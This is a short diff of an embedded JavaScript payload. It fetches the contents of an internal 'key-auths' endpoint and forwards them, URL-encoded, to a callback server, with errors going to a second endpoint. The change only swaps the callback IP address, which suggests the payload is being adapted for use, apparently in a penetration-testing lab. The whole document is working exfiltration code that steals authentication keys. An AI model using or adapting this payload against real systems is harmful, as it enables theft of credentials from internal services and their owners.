@@ -5,9 +5,9 @@
             fetch("http://172.16.16.2:8001/key-auths")
             .then((response) => response.text())
             .then((data) => {
-                fetch("http://192.168.45.195/callback?" + encodeURIComponent(data));
+                fetch("http://192.168.45.224/callback?" + encodeURIComponent(data));
             }).catch(err => {
-                fetch("http://192.168.45.195/error?" + encodeURIComponent(err));
+                fetch("http://192.168.45.224/error?" + encodeURIComponent(err));
             }); 
         }
 </script>
